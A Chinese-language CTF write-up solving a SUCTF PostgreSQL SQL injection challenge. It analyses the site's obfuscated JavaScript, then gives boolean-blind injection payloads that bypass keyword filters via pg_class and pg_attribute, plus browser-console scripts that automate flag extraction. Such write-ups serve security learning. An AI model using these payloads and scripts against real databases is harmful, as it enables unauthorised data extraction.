

# SUCTF-SQLI(PostgreSQL)

来源：SUCTF比赛

漏洞描述：这是一道SQL注入的题目，根据后续的测试发现是盲注，通过响应的不同来判断flag,进行爆破。

解决方案：

题目环境是一个检索框：

![image-20260314151259134](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260314151259134.png)

还有一个附件，其中有个app.js的源码：

```JavaScript
(() => {
  const _s = [
    "L2FwaS9zaWdu",
    "L2FwaS9xdWVyeQ==",
    "UE9TVA==",
    "Y29udGVudC10eXBl",
    "YXBwbGljYXRpb24vanNvbg==",
    "Y3J5cHRvMS53YXNt",
    "Y3J5cHRvMi53YXNt"
  ];
  const _d = (i) => atob(_s[i]);

  const $ = (id) => document.getElementById(id);
  const out = $("out");
  const err = $("err");

  let wasmReady;

  function b64UrlToBytes(s) {
    let t = s.replace(/-/g, "+").replace(/_/g, "/");
    while (t.length % 4) t += "=";
    const bin = atob(t);
    const out = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  }

  function bytesToB64Url(bytes) {
    let bin = "";
    for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  }

  function rotl32(x, r) {
    return ((x << r) | (x >>> (32 - r))) >>> 0;
  }

  function rotr32(x, r) {
    return ((x >>> r) | (x << (32 - r))) >>> 0;
  }

  const rotScr = [1, 5, 9, 13, 17, 3, 11, 19];

  function maskBytes(nonceB64, ts) {
    const nb = b64UrlToBytes(nonceB64);
    let s = 0 >>> 0;
    for (let i = 0; i < nb.length; i++) {
      s = (Math.imul(s, 131) + nb[i]) >>> 0;
    }
    const hi = Math.floor(ts / 0x100000000);
    s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
    const out = new Uint8Array(32);
    for (let i = 0; i < 32; i++) {
      s ^= (s << 13) >>> 0;
      s ^= s >>> 17;
      s ^= (s << 5) >>> 0;
      out[i] = s & 0xff;
    }
    return out;
  }

  function unscramble(pre, nonceB64, ts) {
    const buf = b64UrlToBytes(pre);
    if (buf.length !== 32) throw new Error("prep");
    for (let i = 0; i < 8; i++) {
      const o = i * 4;
      let w =
        (buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24)) >>> 0;
      w = rotr32(w, rotScr[i]);
      buf[o] = w & 0xff;
      buf[o + 1] = (w >>> 8) & 0xff;
      buf[o + 2] = (w >>> 16) & 0xff;
      buf[o + 3] = (w >>> 24) & 0xff;
    }
    const mask = maskBytes(nonceB64, ts);
    for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
    return buf;
  }

  function probeMask(probe, ts) {
    let s = 0 >>> 0;
    for (let i = 0; i < probe.length; i++) {
      s = (Math.imul(s, 33) + probe.charCodeAt(i)) >>> 0;
    }
    const hi = Math.floor(ts / 0x100000000);
    s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
    const out = new Uint8Array(32);
    for (let i = 0; i < 32; i++) {
      s = (Math.imul(s, 1103515245) + 12345) >>> 0;
      out[i] = (s >>> 16) & 0xff;
    }
    return out;
  }

  function mixSecret(buf, probe, ts) {
    const mask = probeMask(probe, ts);
    if (mask[0] & 1) {
      for (let i = 0; i < 32; i += 2) {
        const t = buf[i];
        buf[i] = buf[i + 1];
        buf[i + 1] = t;
      }
    }
    if (mask[1] & 2) {
      for (let i = 0; i < 8; i++) {
        const o = i * 4;
        let w =
          (buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24)) >>> 0;
        w = rotl32(w, 3);
        buf[o] = w & 0xff;
        buf[o + 1] = (w >>> 8) & 0xff;
        buf[o + 2] = (w >>> 16) & 0xff;
        buf[o + 3] = (w >>> 24) & 0xff;
      }
    }
    for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
    return buf;
  }

  async function loadWasm() {
    if (wasmReady) return wasmReady;
    wasmReady = (async () => {
      const go1 = new Go();
      const resp1 = await fetch("/static/" + _d(5));
      const buf1 = await resp1.arrayBuffer();
      const { instance: inst1 } = await WebAssembly.instantiate(buf1, go1.importObject);
      go1.run(inst1);

      const go2 = new Go();
      const resp2 = await fetch("/static/" + _d(6));
      const buf2 = await resp2.arrayBuffer();
      const { instance: inst2 } = await WebAssembly.instantiate(buf2, go2.importObject);
      go2.run(inst2);

      for (let i = 0; i < 100; i++) {
        if (typeof globalThis.__suPrep === "function" && typeof globalThis.__suFinish === "function") return true;
        await new Promise((r) => setTimeout(r, 10));
      }
      throw new Error("wasm init");
    })();
    return wasmReady;
  }

  async function getSignMaterial() {
    const res = await fetch(_d(0), { method: "GET" });
    const data = await res.json();
    if (!data.ok) throw new Error(data.error || "sign");
    return data.data;
  }

  async function doQuery() {
    err.textContent = "";
    out.textContent = "";
    const q = $("q").value || "";
    if (!q) {
      err.textContent = "empty";
      return;
    }
    try {
      await loadWasm();
      const material = await getSignMaterial();
      const ua = navigator.userAgent || "";
      const uaData = navigator.userAgentData;
      const brands = uaData && uaData.brands ? uaData.brands.map((b) => b.brand + ":" + b.version).join(",") : "";
      const tz = (() => {
        try {
          return Intl.DateTimeFormat().resolvedOptions().timeZone || "";
        } catch {
          return "";
        }
      })();
      const intl = (() => {
        try {
          return Intl.DateTimeFormat().resolvedOptions().locale ? "1" : "0";
        } catch {
          return "0";
        }
      })();
      const wd = navigator.webdriver ? "1" : "0";
      const probe = "wd=" + wd + ";tz=" + tz + ";b=" + brands + ";intl=" + intl;

      const pre = globalThis.__suPrep(
        _d(2),
        _d(1),
        q,
        material.nonce,
        String(material.ts),
        material.seed,
        material.salt,
        ua,
        probe
      );
      if (!pre) throw new Error("prep");
      const secret2 = unscramble(pre, material.nonce, material.ts);
      const mixed = mixSecret(secret2, probe, material.ts);
      const sig = globalThis.__suFinish(
        _d(2),
        _d(1),
        q,
        material.nonce,
        String(material.ts),
        bytesToB64Url(mixed),
        probe
      );

      const res = await fetch(_d(1), {
        method: _d(2),
        headers: { [_d(3)]: _d(4) },
        body: JSON.stringify({ q, nonce: material.nonce, ts: material.ts, sign: sig })
      });
      const data = await res.json();
      if (!data.ok) {
        err.textContent = data.error || "error";
        return;
      }
      out.textContent = JSON.stringify(data.data, null, 2);
    } catch (e) {
      err.textContent = String(e.message || e);
    }
  }

  window.addEventListener("DOMContentLoaded", () => {
    $("run").addEventListener("click", doQuery);
    $("q").addEventListener("keydown", (e) => {
      if (e.key === "Enter") doQuery();
    });
  });
})();

```

首先把隐藏接口解码：

```
"L2FwaS9zaWdu",    /api/sign
"L2FwaS9xdWVyeQ==",      /api/query
"UE9TVA==",             POST
"Y29udGVudC10eXBl",        content-type
"YXBwbGljYXRpb24vanNvbg==",     application/json
"Y3J5cHRvMS53YXNt",            crtpto1.wasm
"Y3J5cHRvMi53YXNt"              cryptol.wasm
```

#### WASM

WebAssembly=可以在浏览器里运行的接近机器码的程序格式。（一种在浏览器里运行的高性能二进制程序格式。）

> 浏览器内部有一个WASM虚拟机专门执行`.wasn`文件。
>
> 在Web安全中，网站会把核心逻辑写进wasm中，很难分析。

#### JS代码分析

通过代码审计，得出前端的核心流程：

`输入q`--->`GET /api/sign` ----> `得到nonce,ts,seed,salt`----> `WASM计算sign` ---> `POST /api/query`

所以说服务器只相信sign，但是sign的计算逻辑在wasm中，所以我们要做的不是绕过sign,而是让sign仍然合法。

也就是说，还是让浏览器帮我们计算sign，同等与不能用burp抓包或者其他方式来发送请求，只能用浏览器。

#### 注入测试：

在输入框中输入 `'`,获得：

```
ERROR: unterminated quoted string at or near "' LIMIT 20" (SQLSTATE 42601)
```

再尝试其他的payload，发现 `and,or,union` 都被blocked了。

**根据这条报错，我们可以通过 `SQLSTATE 42601` 确定这是postgreSQL。**

还可以基本确定SQL的查询结构：

```
SELECT * FROM table WHERE name LIKE '%q%' LIMIT 20
SELECT * FROM table WHERE name = 'q' LIMIT 20
```

> #### 绕过and,or封禁
>
> 在postgre中有很多替代写法
>
> ```
> or = ||
> 例如：' || '1'='1
> and = in
> 例如：
> ```

用||代替or继续注入测试：payload：`' || '1'='1`

响应为：`ERROR: invalid input syntax for type boolean: "1%"`

再结合上一个错误响应：`unterminated quoted string at or near "' LIMIT 20"`

可以推测SQL语句的最终结构：（这是postgreSQL常用的结构）

```
SELECT * 
FROM table
WHERE name LIKE '%' || q || '%'
LIMIT 20;
```

#### CASE WHEN

由于or和and被ban,而且在postgreSQL中，||是字符串拼接，所以我们可以做 **表达式注入**

```
CASE WHEN 条件 THEN 'a' ELSE 'b' END
```

而且不需要or和and

所以构造payload：

```
'||(SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END)||'
```

如果成立就会返回a，真实响应为：

```
[
  {
    "id": 2,
    "title": "Patch notes 0x01"
  },
  {
    "id": 3,
    "title": "Service status"
  }
]
```

虽然没有返回a，但是也没有报错，说明结构正确。

先尝试一下被基本子查询，看能不能返回：`'|| (SELECT 'abc')||'`，响应为 `[]`，说明SELECT不能直接回显。换成布尔盲注

#### 布尔盲注

我通过尝试：`'||(SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END)||'`和 `'||(SELECT CASE WHEN (1=2) THEN 'a' ELSE 'b' END)||'`发现这两个的返回结果不一样，一个是有内容的，一个只是 `[]`，所以说明，表达式确实被执行了，只是不回显，所以我们来进行布尔盲注。



#### 开始爆表

> 可做可不做，试着读一下数据库的版本：
>
> `ascii(substr(version(),1,1))`
>
> payload:
>
> `'|| (SELECT CASE WHEN ascii(substr(version(),1,1))>70 THEN 'a' ELSE 'zzzzz' END)||'`
>
> 查看响应推测是否为真

爆flag表：

在PostgreSQL中，表名：`information_schema.tables`

payload:

```
'||(
SELECT CASE
WHEN(SELECT COUNT(*)
FROM information_schema.tables
WHERE table_name='flag'
)>0
THEN 'a'
ELSE 'zzzz'
END
)||'
```

查看响应，又被blocked了。通过测试，是 `information_schema`被ban掉的

##### 绕开information_schema

1. 用系统视图：`pg_catalog`

   PostgreSQL的表信息：`pg_catalog.pg_tables`

2. 用系统表：`pg_class`

   表名：`table_name`换成 `relname`

通过测试我们发现 `pg_class`没有被拦截，所以重新构造payload：

```
'|| (SELECT CASE
WHEN (SELECT COUNT(*) FROM pg_class WHERE relname='flag')>0
THEN 'a'
ELSE 'ZZZZ'
END)||'
```

这个payload是成立，但是根据响应 `[]` 我们可以知道没有flag这个表。

所以我们得猜测有flag的表名叫什么，通常情况下，有这几种可能：`flags,ctf_flag,flag_table,secret,secrets`,但一个个猜很费解，更好的方式是直接从`pg_class`盲注表名。

PostgreSQL的表名都在：`pg_class.relname`中。我们需要逐字符猜测：

读取表名的SQL语句为：`SELECT relname FROM pg_class WHERE relkind='r' LIMIT 1 OFFSET n`

> 简单解释一下这个语句：
>
> `relkind`是指表的类别，常见值：r:普通表，i:索引，v:视图
>
> `OFFSET` 的意思是：跳过前面的n条记录。
>
> 在SQL注入中，一般一次只能返回一条数据，所以利用`offset`来循环，慢慢把表名爆出来。

在爆表之前，我们还是可以先尝试一下比较常见的表名：secret,flag,key.

```
'|| (SELECT CASE
WHEN (SELECT relname FROM pg_class WHERE relkind='r' LIMIT 1 OFFSET 0)='secret'
THEN 'a'
ELSE 'zzzz'
END
)||'
```

按照响应是错误的，所以不是。

这里爆表有好几个方法：

#### 爆表方法合集：

> 1. 用substr来逐字符爆破：
>
>    ```
>    '||(SELECT CASE
>    WHEN substr((SELECT relname FROM pg_class WHERE relkind = 'r' LIMIT 1 OFFSET 0),1,1)='p'
>    THEN 'a'
>    ELSE 'zzz'
>    END
>    )||'
>    ```
>
>    这里可以用`offset`也可以不用，用的话就是全自动化，不用的话爆一个名字自己改一下。
>
> 2. 用COUNT来爆破，爆破常见表名
>
>    ```
>    '||(SELECT CASE
>    WHEN (SELECT COUNT(*) FROM pg_class WHERE relname='posts')>0
>    THEN 'a'
>    ELSE 'zzzz'
>    END
>    )||'
>    ```

根据以上两种方法的爆破（也没有爆破，运气比较好，尝试了一下就发现第一个表为posts）

所以数据库里面有posts表，但是很不幸运的是，这个表里面没有flag，所以就不写爆这个表的列名了，因为和爆包含flag表的方法是一样的。

因为第一个表是posts，所以开始爆第二个表，发现是`secrets`，flag大概率就在这个表里面了。

#### 爆列名

PostgreSQL的列信息在：`pg_attribute`，列名为：`attname`，列所属的表：`attrelid`，列序号：`attnum`

##### `attrelid`:

意思是列所属的表 OID，在PostgreSQL内部每个表都有一个 OID(对象ID)

##### `::regclass`

```
'posts'::regclass 这是PostgreSQL类型转换，把表名转化成OID
```

> 最初版本爆列名：
>
> ```
> '||(SELECT
> CASE WHEN(
> SELECT COUNT(*) FROM pg_attribute
> WHERE attrelid='secrets'::regclass
> AND attname = 'flag')>0
> THEN 'a'
> ELSE 'zzz'
> END
> )||'
> ```
>
> 但是and被ban了，所以我们得嵌套查询

```
'||(SELECT
CASE WHEN 'flag' IN(
SELECT attname FROM pg_attribute
WHERE attrelid=(SELECT OID FROM pg_class WHERE relname='secrets')
)THEN 'a'
ELSE 'zzz'
END
)||'
```

根据响应，是存在flag列的，现在只需要盲注读取flag的内容。

```
'||(
SELECT CASE
WHEN substr((SELECT flag FROM secrets LIMIT 1),1,1)='S'
THEN 'a'
ELSE 'zzzzz'
END
)||'
```

这里根据官方所给的flag的基本格式来测试第一个字符，根据响应发现第一个字符确实是S，手动测试已知的前6个字符：`SUCTF{`

手动盲注是很耗时间的，所以我们来写脚本自动化盲注，由于本题只能让浏览器发送请求，所以我们在浏览器console里面写JS自动爆：

```
async function exploit(){

let charset="abcdefghijklmnopqrstuvwxyzQWERTYUIOPASDFGHJKLZXCVBNM0123456789{}_"
let flag="SUCTF{"

while(true){

 for(let c of charset){

  let payload = "'||(SELECT CASE WHEN substr((SELECT flag FROM secrets LIMIT 1),"+(flag.length+1)+",1)='"+c+"' THEN 'a' ELSE 'zzzzz' END)||'"

  document.getElementById("q").value = payload
  document.getElementById("run").click()

  await new Promise(r=>setTimeout(r,800))

  let res = document.getElementById("out").innerText

  if(res.includes("Patch notes")){
    flag += c
    console.log("FOUND:",flag)
    break
  }

 }

 if(flag.endsWith("}")){
  console.log("FLAG:",flag)
  return
 }

}

}
```

这个最初的脚本爆到第13位就爆不出来了，所以怀疑是否是字典数不足，通过测试(随便填一个字母去爆下一位是可以爆出来的)所以我们要扩大字典容量或者写一个不会卡字符的脚本，爆ASKLL码：

```
async function exploit(){

let flag="SUCTF{"

while(true){

 let pos = flag.length + 1
 let low = 32
 let high = 126

 while(low <= high){

  let mid = Math.floor((low + high) / 2)

  let payload="'||(SELECT CASE WHEN ascii(substr((SELECT flag FROM secrets LIMIT 1),"+pos+",1))>"+mid+" THEN 'a' ELSE 'zzzzz' END)||'"

  document.getElementById("q").value=payload
  document.getElementById("run").click()

  await new Promise(r=>setTimeout(r,900))

  let res=document.getElementById("out").innerText

  if(res.includes('"id":')){
    low = mid + 1
  }else{
    high = mid - 1
  }

 }

 let char = String.fromCharCode(low)

 console.log("pos:",pos," ascii:",low," char:",char)

 flag += char

 console.log("FLAG:",flag)

 if(char=="}"){
  console.log("FINAL FLAG:",flag)
  return
 }

}

}

exploit()
```

最终爆出flag：SUCTF{P9s9L_!Lject!On_IS_3@$Y_RiGht}

